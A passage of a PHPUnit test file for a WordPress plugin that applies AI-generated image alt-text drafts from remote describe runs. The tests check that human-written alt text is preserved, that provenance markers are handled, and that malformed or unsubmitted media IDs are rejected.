                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame($draft, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        // Stale marker left in place for the run that owns it.
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame('22222222-2222-2222-2222-222222222222', $pending['run_id']);
    }

    /**
     * BR-82: pending marker whose draft_hash does not match the current draft
     * (draft changed since the partial) must stay guarded.
     */
    public function testApplyRunDraftsGuardsWhenPendingMarkerDraftHashDiffers(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $currentDraft = 'a dog in a park';
        // Stored alt equals the *current* draft (coincidental / re-describe),
        // but the marker was for an older draft string.
        $this->setPostMeta(71, '_wp_attachment_image_alt', $currentDraft);
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', 'older draft that is no longer current'),
        ]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $currentDraft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame($currentDraft, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
    }

    /**
     * BR-82: human-authored alt equal to draft with human-edit meta present and
     * no pending marker stays guarded; human-edit meta is untouched.
     */
    public function testApplyRunDraftsGuardsHumanAuthoredAltEqualToDraftWithoutMarker(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $draft = 'a dog in a park';
        $humanEdit = [
            'source' => 'inline_correction',
            'edited_at' => '2026-01-01T00:00:00+00:00',
            'previous_alt' => 'something else',
        ];
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(71, '_acx_description_human_edit', $humanEdit);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame($draft, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        $this->assertSame($humanEdit, get_post_meta(71, '_acx_description_human_edit', true));
    }

    /**
     * BR-88a / BR-126: alt===draft with provenance already this run's envelope
     * stays skipped_existing; provenance must be byte-identical after apply
     * (no applied_at churn). BR-114: matching marker is cleared on rejection.
     */
    public function testApplyRunDraftsSkipsWhenProvenanceAlreadyComplete(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $draft = 'a dog in a park';
        $existingProv = [
            'adapter' => 'florence',
            'model_id' => 'florence-2',
            'source' => 'bulk_describe_run',
            'run_id' => $runId,
            'applied_at' => '2026-01-15T12:00:00+00:00',
            'alt_text_draft' => $draft,
        ];
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(71, '_acx_description_provenance', $existingProv);
        // Matching marker must not reopen a completed provenance write for this run.
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', $draft),
        ]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame($draft, get_post_meta(71, '_wp_attachment_image_alt', true));
        // Byte-identical: no applied_at churn from a re-stamp.
        $this->assertSame($existingProv, get_post_meta(71, '_acx_description_provenance', true));
        // BR-114: orphaned marker for a completed this-run envelope is cleared.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-98: bulk-applied provenance must carry alt_text_draft so history's
     * resolve_generated_alt_text does not render "No draft recorded."
     */
    public function testApplyRunDraftsProvenanceCarriesAltTextDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([71], $data['applied']);
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('a dog in a park', $prov['alt_text_draft']);
        $this->assertSame(get_post_meta(71, '_wp_attachment_image_alt', true), $prov['alt_text_draft']);
    }

    /**
     * BR-92: duplicate media_id rows are collapsed to first-seen so one id
     * cannot land in two mutually exclusive buckets.
     */
    public function testApplyRunDraftsDedupesDuplicateMediaIdsToFirstSeen(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    // First-seen wins: draft A applied.
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'first draft wins', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                    // Same id, different draft — must not produce a second bucket entry.
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'second draft would conflict', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['skipped_existing']);
        $this->assertSame([], $data['skipped_no_draft']);
        $this->assertSame([], $data['failed']);
        // First-seen draft only.
        $this->assertSame('first draft wins', get_post_meta(71, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('first draft wins', $prov['alt_text_draft']);
    }

    /**
     * Guard still holds: when stored alt differs from the draft (operator-
     * authored text), existing_alt without overwrite_media_ids stays
     * skipped_existing — non-clobber completion must not weaken real opt-in.
     */
    public function testApplyRunDraftsStillGuardsWhenStoredAltDiffersFromDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        // Operator alt differs from draft 70 ("a cat on a sofa").
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        // 71 also has operator alt that is not the draft — must not auto-apply.
        $this->setPostMeta(71, '_wp_attachment_image_alt', 'different human alt');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        // Both existing-alt items differ from their drafts → both guarded.
        $this->assertSame([70, 71], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame('human-authored alt', get_post_meta(70, '_wp_attachment_image_alt', true));
        $this->assertSame('different human alt', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(70, '_acx_description_provenance', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
    }

    /**
     * BR-119: matching pending marker + stored alt ≠ draft + no provenance must
     * stay skipped_existing (anti-clobber). Goes RED if `$stored_alt === $draft`
     * is deleted from the recovery predicate. BR-114: marker cleared on alt diverge.
     */
    public function testApplyRunDraftsGuardsWhenPendingMarkerButStoredAltDiffersFromDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $draft = 'a dog in a park';
        $operatorAlt = 'operator edited after partial';
        $this->setPostMeta(71, '_wp_attachment_image_alt', $operatorAlt);
        // Matching marker would unlock recovery if the anti-clobber conjunct were gone.
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', $draft),
        ]);
        // No provenance — only the alt!==draft conjunct keeps this guarded.
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame([], $data['failed']);
        // Operator edit preserved; draft not applied; no provenance invented.
        $this->assertSame($operatorAlt, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        // BR-114: this run's marker is obsolete after alt diverged.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-119: non-string stored alt with a matching marker must stay guarded
     * (is_string conjunct). WP stub allows planting non-string meta.
     */
    public function testApplyRunDraftsGuardsWhenStoredAltIsNonStringWithPendingMarker(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $draft = 'a dog in a park';
        // Corrupt / unexpected meta type — must not unlock recovery.
        $this->setPostMeta(71, '_wp_attachment_image_alt', ['not' => 'a string']);
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', $draft),
        ]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame(['not' => 'a string'], get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        // Non-string alt is an alt-diverge rejection for this run's marker.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-106: when the first row for a media_id has no draft and a later row has
     * one, keep the usable draft — not first-seen-at-any-cost.
     */
    public function testApplyRunDraftsDedupesPreferringFirstNonEmptyDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    // First-seen has no draft — must not force skipped_no_draft.
                    ['media_id' => 71, 'status' => 'failed', 'alt_text_draft' => null, 'caption' => null, 'provenance' => null],
                    // Later completed row carries the only usable draft.
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'good draft', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['skipped_no_draft']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['failed']);
        $this->assertSame('good draft', get_post_meta(71, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('good draft', $prov['alt_text_draft']);
    }

    /**
     * BR-102: when provenance fails and the recovery marker cannot be planted,
     * the item is `failed` (not `partial`). Partial is presented as retryable;
     * without a marker the next apply cannot recover. [RLSE-05] [INT-11]
     */
    public function testApplyRunDraftsBucketsFailedWhenMarkerWriteFails(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        // Alt write succeeds; provenance write fails; marker write also fails.
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance_pending'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        // Not partial — recovery is impossible without a marker.
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([71], $data['failed']);
        // Alt stayed written (no roll-back); marker absent; provenance absent.
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-107: run_id for markers and the response comes from the path, not the
     * items body — omitting body run_id must not plant an empty-string marker.
     */
    public function testApplyRunDraftsUsesPathRunIdWhenItemsBodyOmitsRunId(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            // Body deliberately omits run_id.
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame($runId, $data['run_id']);
        $this->assertSame([71], $data['partial']);
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($runId, $pending['run_id']);
        $this->assertSame(hash('sha256', 'a dog in a park'), $pending['draft_hash']);
    }

    /**
     * BR-107: items body run_id that disagrees with the path is rejected 400.
     */
    public function testApplyRunDraftsRejectsWhenItemsBodyRunIdDisagreesWithPath(): void
    {
        $pathRunId = '11111111-1111-1111-1111-111111111111';
        $bodyRunId = '22222222-2222-2222-2222-222222222222';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($pathRunId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $bodyRunId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $pathRunId . '/apply');
        $request->set_param('run_id', $pathRunId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_id_mismatch', $response->get_error_code());
        $this->assertSame(400, $response->get_error_data()['status'] ?? null);
        // Nothing written.
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
    }

    /**
     * BR-126: matching marker + alt===draft + pre-existing provenance from a
     * *different* run must complete (replace old envelope) and clear the marker.
     * Pins the narrow "not already this run's provenance" conjunct.
     */
    public function testApplyRunDraftsRecoversPartialWhenOlderProvenanceExists(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $draft = 'a cat on a sofa';
        $oldProv = [
            'adapter' => 'florence',
            'model_id' => 'old-model',
            'source' => 'cli_describe',
            'run_id' => '00000000-0000-0000-0000-000000000099',
            'applied_at' => '2025-01-01T00:00:00+00:00',
            'alt_text_draft' => 'An older generated draft.',
        ];
        // After a prior partial: alt is the new draft, marker planted, old prov remains.
        $this->setPostMeta(70, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(70, '_acx_description_provenance', $oldProv);
        $this->setPostMeta(70, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', $draft),
        ]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [70]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'cat', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        // No overwrite — recovery must complete despite older provenance.

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([70], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['skipped_existing']);
        $this->assertSame($draft, get_post_meta(70, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(70, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame($runId, $prov['run_id']);
        $this->assertSame($draft, $prov['alt_text_draft']);
        $this->assertSame('bulk_describe_run', $prov['source']);
        $this->assertSame('', get_post_meta(70, '_acx_description_provenance_pending', true));
    }

    public function testApplyReturns404WhenRunNotFound(): void
    {
        // D1-03: a status-endpoint 404 (run id does not exist) is surfaced as an
        // honest 404, not the generic 409 "current status: unknown".
        $runId = '99999999-9999-9999-9999-999999999999';
        $this->queueHttpResponse([
            'response' => ['code' => 404, 'message' => 'Not Found'],
            'body' => json_encode(['detail' => 'run not found']),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_not_found', $response->get_error_code());
        $this->assertSame(404, $response->get_error_data()['status'] ?? null);
        // Rejected after the status read, before fetching items.
        $this->assertCount(1, $this->getHttpCalls());
    }

    public function testGetRunItemsPassesThroughProxyWpErrorUnchanged(): void
    {
        // S2-02: a transport-level WP_Error from the proxy is returned untouched.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->queueHttpResponse(new \WP_Error('http_request_failed', 'connection refused'));

        $request = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId . '/items');
        $request->set_param('run_id', $runId);

        $response = $this->controller->get_describe_run_items($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('http_request_failed', $response->get_error_code());
    }

    public function testGetRunItemsPassesThroughBodyMissingItemsKey(): void
    {
        // S2-02: a 200 body without an 'items' key is passed through untouched.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode(['tenant_id' => self::currentTenantId(), 'run_id' => $runId]),
        ]);

        $request = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId . '/items');
        $request->set_param('run_id', $runId);

        $response = $this->controller->get_describe_run_items($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());
        $data = $response->get_data();
        $this->assertArrayNotHasKey('items', $data);
        $this->assertSame($runId, $data['run_id']);
    }

    /**
     * BR-129: without a locally recorded media_id set, apply fails closed (502).
     * Goes RED if apply falls back to trusting the remote items list.
     */
    public function testApplyFailsClosedWhenSubmittedMediaIdsMissing(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        // Intentionally do NOT plant submitted media ids.
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'hostile draft', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_media_ids_unknown', $response->get_error_code());
        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-129: non-numeric media_id strings must be rejected, not (int)-coerced.
     * Submitted set deliberately includes 71 so that coercing "71junk"→71 would
     * pass membership and write — the strict parser is the only brake. Goes RED
     * if parse_strict_positive_int falls back to (int) casting.
     */
    public function testApplyRejectsNonNumericMediaIdWith502(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        // 71 is in the submitted set: coercion would authorize the write.
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    // Coercible junk: (int)"71junk" === 71 under the old path.
                    ['media_id' => '71junk', 'status' => 'completed', 'alt_text_draft' => 'injected alt', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_items_contract_violation', $response->get_error_code());
        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-129: a strict positive int media_id that was never submitted is also 502.
     */
    public function testApplyRejectsUnsubmittedStrictMediaIdWith502(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantSubmittedMediaIds($runId, [70]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'foreign target', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_items_contract_violation', $response->get_error_code());
        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-129: items response larger than the per-run media-id cap is 502.
     */
    public function testApplyRejectsItemsOverflowWith502(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        add_filter('acx_describe_run_max_items', static fn (): int => 2);
        $this->plantSubmittedMediaIds($runId, [70, 71]);
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'a', 'caption' => null, 'provenance' => null],
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'b', 'caption' => null, 'provenance' => null],
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'c', 'caption' => null, 'provenance' => null],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_items_overflow', $response->get_error_code());
        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
        $this->assertSame('', get_post_meta(70, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-130 sibling: bulk-apply strips hostile markup from alt_text_draft before
     * writing _wp_attachment_image_alt. Distinct from DescribeMediaService's
     * normalize_alt_text_draft / alt_text_long paths — this is the apply loop
     * in DescribeController. Goes RED if the apply path writes the raw draft.
     */
    public function testApplyStripsHostileMarkupFromAltTextDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueRunStatusResponse($runId, 'completed');
